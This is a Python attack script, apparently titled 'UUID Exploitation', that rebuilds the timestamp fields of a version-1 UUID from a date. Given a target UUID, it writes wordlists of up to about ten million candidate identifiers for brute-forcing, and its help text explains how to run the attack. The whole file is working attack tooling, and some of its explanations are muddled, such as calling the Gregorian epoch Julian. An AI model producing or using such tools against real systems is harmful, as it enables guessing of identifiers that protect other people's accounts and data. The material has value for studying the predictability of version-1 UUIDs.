import datetime


class ConsoleColors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    END = '\033[0m'
    BLUE = '\033[94m'
    YELLOW = '\033[93m'

print('''

/ ,-----------------. \\
| | UUID Exploitation | 
| `-----------------' |
| [@ ] On/Off  ###### |
|              ###### |
| [U] [U] [1] [D] [AC]|
|                     |
| [H] [4] [C] [K] [%] |
|                     |
| [1] [2] [3] [+] [-] |
|                     |
| [0] [.]  [EXP]  [=] |
\_____________________/

''')

def gregorian_to_nanos(year, month, day, hour=0, minute=0, second=0):
    gregorian_date = datetime.datetime(year, month, day, hour, minute, second)
    epoch_start = datetime.datetime(1582, 10, 15)
    time_difference = gregorian_date - epoch_start
    nanoseconds = time_difference.total_seconds() * 10**9
    return int(nanoseconds)

# Get date information from the user
year = int(input("Year: "))
month = int(input("Month: "))
day = int(input("Day: "))
hour = int(input("Hour (optional, default: 0): ") or 0)
minute = int(input("Minute (optional, default: 0): ") or 0)
second = int(input("Second (optional, default: 0): ") or 0)

# Convert Gregorian date to nanoseconds
nanoseconds = gregorian_to_nanos(year, month, day, hour, minute, second)

print(ConsoleColors.RED,"Given date            :", datetime.datetime(year, month, day, hour, minute, second),ConsoleColors.END)
print(ConsoleColors.RED,"Value in nanoseconds  :", nanoseconds,ConsoleColors.END)

UUIDNano = str(nanoseconds)[:-2]
HexNano = hex(int(UUIDNano))
print(ConsoleColors.GREEN,"UUID Type Nano Seconds:", UUIDNano,ConsoleColors.END)
print(ConsoleColors.GREEN,"Time                  :",str(UUIDNano)[:11],ConsoleColors.END)
print(ConsoleColors.GREEN,"Micro Time             :",str(UUIDNano)[-7:],ConsoleColors.END)
print(ConsoleColors.GREEN,"Hexadecimal           :", HexNano[2:],ConsoleColors.END)
print(ConsoleColors.RED,"UUID Generator",ConsoleColors.END)
print(ConsoleColors.BLUE,"Part 1:", HexNano[2:5].upper(),ConsoleColors.END)
print(ConsoleColors.BLUE,"Part 2:", HexNano[5:9].upper(),ConsoleColors.END)
print(ConsoleColors.BLUE,"Part 3:", HexNano[9:].upper(),ConsoleColors.END)
print(ConsoleColors.RED,"Possibilities",ConsoleColors.END)
print(ConsoleColors.BLUE,"UUID Nano Seconds Info (Hex)   :",HexNano[9:].upper(),ConsoleColors.END)
print(ConsoleColors.BLUE,"UUID Nano Seconds Info (Dec)   :",int(HexNano[9:], 16),ConsoleColors.END)
print(ConsoleColors.BLUE,"UUID Nano Seconds Info (Dec) +1:",int(str(int(HexNano[9:], 16))[:2] + str(int(str(int(HexNano[9:], 16))[2]) + 1) + str(int(HexNano[9:], 16))[3:]),ConsoleColors.END)
print(ConsoleColors.BLUE,"Attack Edit Nano Time :",str(UUIDNano)[:11]+"1000000",ConsoleColors.END)
AttackNano = hex(int(str(UUIDNano)[:11]+"1000000"))
UUIDAttack = input("UUID to Attack : ")
print(ConsoleColors.BLUE,"Part 1:", UUIDAttack[14:17].upper(),ConsoleColors.END)
print(ConsoleColors.BLUE,"Part 2:", UUIDAttack[9:13].upper(),ConsoleColors.END)
print(ConsoleColors.BLUE,"Part 3:", UUIDAttack[:8].upper(),ConsoleColors.END)
## Tarafını Seç
Option = input("One Time Attack - Create Wordlist Y/N ")

if Option.upper() == "Y":
    Start = int(str(UUIDNano)[:11] +  "0000000")
    End = int(str(UUIDNano)[:11] + "9990000")
    Step = (End - Start) // 999
    with open("OneTimeUUID.txt", "w") as f:
        for AttackTime in range(Start, End + 1, Step):
            HexNanoAttack = hex(int(str(AttackTime)))
            OutpuLine = (HexNanoAttack[9:].lower() + "-" +
                         HexNanoAttack[5:9].lower() + "-" +
                         UUIDAttack[14] + HexNanoAttack[2:5].lower() + "-" +
                         UUIDAttack[19:23] + "-" + UUIDAttack[-12:])
            print(OutpuLine, file=f)
    print(ConsoleColors.GREEN,"Wordlist Creation Successful.",ConsoleColors.END)
elif Option.upper() == "N":
    print(ConsoleColors.RED,"Wordlist Creation Failed.",ConsoleColors.END)
else:
    print(ConsoleColors.RED,"Invalid Option",ConsoleColors.END)


Option2 = input("Full Attack - Create Wordlist Y/N ")

if Option2.upper() == "Y":
    with open("FullAttackUUID.txt", "w") as f:
        Start_Full = int(str(UUIDNano)[:11] + "0000000")
        End_Full = int(str(UUIDNano)[:11] + "9999999")
        Step_Full = 1
        for AttackTime in range(Start_Full, End_Full + 1, Step_Full):
            HexNanoAttack_Full = hex(int(str(AttackTime)))
            OutpuLine = (HexNanoAttack_Full[9:].lower() + "-" +
                           HexNanoAttack_Full[5:9].lower() + "-" +
                           UUIDAttack[14] + HexNanoAttack_Full[2:5].lower() + "-" +
                           UUIDAttack[19:23] + "-" + UUIDAttack[-12:])
            print(OutpuLine, file=f)
    print(ConsoleColors.GREEN,"Wordlist Creation Successful.",ConsoleColors.END)
elif Option2.upper() == "N":
    print(ConsoleColors.RED,"Wordlist Creation Failed.",ConsoleColors.END)
else:
    print(ConsoleColors.RED,"Invalid Option",ConsoleColors.END)


print(ConsoleColors.RED,"Would you like to generate with a +1 second difference ? \n",ConsoleColors.END)

Option3 = input("One Time Attack v2 - Create Wordlist Y/N ")

if Option3.upper() == "Y":
    #Start = int(str(UUIDNano)[:11] +  "0000000")
    #End = int(str(UUIDNano)[:11] + "9990000")
    Start = int(str(UUIDNano)[:11]) + 1
    Start = int(str(Start) + "0000000")
    End = int(str(UUIDNano)[:11]) + 1
    End = int(str(End) + "9990000")
    Step = (End - Start) // 999
    with open("OneTimeUUIDv2.txt", "w") as f:
        for AttackTime in range(Start, End + 1, Step):
            HexNanoAttack = hex(int(str(AttackTime)))
            OutpuLine = (HexNanoAttack[9:].lower() + "-" +
                         HexNanoAttack[5:9].lower() + "-" +
                         UUIDAttack[14] + HexNanoAttack[2:5].lower() + "-" +
                         UUIDAttack[19:23] + "-" + UUIDAttack[-12:])
            print(OutpuLine, file=f)
    print(ConsoleColors.GREEN,"Wordlist Creation Successful.",ConsoleColors.END)
elif Option3.upper() == "N":
     print(ConsoleColors.RED,"Wordlist Creation Failed.",ConsoleColors.END)
else:
    print(ConsoleColors.RED,"Invalid Option",ConsoleColors.END)


Option4 = input("Full Attack v2 - Create Wordlist Y/N ")

if Option4.upper() == "Y":
    with open("FullAttackUUIDv2.txt", "w") as f:
        #Start_Full = int(str(UUIDNano)[:11] + "0000000")
        #End_Full = int(str(UUIDNano)[:11] + "9999999")
        Start_Full = int(str(UUIDNano)[:11]) + 1
        Start_Full = int(str(Start_Full) + "0000000")
        End_Full = int(str(UUIDNano)[:11]) + 1
        End_Full = int(str(End_Full) + "9999999")
        Step_Full = 1
        for AttackTime in range(Start_Full, End_Full + 1, Step_Full):
            HexNanoAttack_Full = hex(int(str(AttackTime)))
            OutpuLine = (HexNanoAttack_Full[9:].lower() + "-" +
                           HexNanoAttack_Full[5:9].lower() + "-" +
                           UUIDAttack[14] + HexNanoAttack_Full[2:5].lower() + "-" +
                           UUIDAttack[19:23] + "-" + UUIDAttack[-12:])
            print(OutpuLine, file=f)
    print(ConsoleColors.GREEN,"Wordlist Creation Successful.",ConsoleColors.END)
elif Option4.upper() == "N":
     print(ConsoleColors.RED,"Wordlist Creation Failed.",ConsoleColors.END)
else:
    print(ConsoleColors.RED,"Invalid Option",ConsoleColors.END)

Information = input("Would you like to get manual attack information or General Information or UUID Information ? [ EN ] Y / N ")
if Information.upper() == "Y":
    print(ConsoleColors.YELLOW,'''

When the data 0E4508F5 in Part3 is converted to Hexadecimal, the number 239405301 is obtained.
If only 239405301 is to be changed, the "405301" section can be generated up to one million and an attack can be carried out.

Part 1: 1EE 
Part 2: C16F 
Part 3: 0E4508F5

Respectively,
 [1ee]   [c16f] [0e4508f5] These parts are the UUID Allocation as follows
          
xxxxxxxx-xxxx-x1EE-xxxx-xxxxxxxxxxxx Part 1
xxxxxxxx-C16F-xxxx-xxxx-xxxxxxxxxxxx Part 2
0E4508F5-xxxx-xxxx-xxxx-xxxxxxxxxxxx Part 3
          
There are 4 Wordlists generated in this Attack tool.

The First Wordlist is a 999 Possibility Wordlist that generates between 000 and 999.
The Second Wordlist generates a Wordlist with 9,999,999 Possibilities. It operates with precision.
The Third and Fourth Wordlists are extra precautions created to prevent time shifts that may occur due to the precision in Nano Second generation in Time functions. They are created entirely for precautionary purposes. They can be followed as a second path in case of a possible collision.
          
xxxxxxxx-xxxx-xxxx-xxxx-0800200c9a66 This part is the MAC Address part and varies on the platform generated.
xxxxxxxx-xxxx-xxxx-####-############ These parts generally do not change in UUID v1 structure.
          
It is based on the Julian Calendar. Conversion is done in seconds before Nano in the form of seconds.
Example: 
Nano:        137583952401430000
In seconds: 13758395240.143 > 13758395240 is taken as the base.
Epoch Time = [ January 1, 1970 ] 12219292800
13758395240-12219292800 = The obtained value is converted to EPOCH Time and the created date is obtained.
''',ConsoleColors.END)
elif Information.upper() == "N":
    print(".")
else:
    print(".")

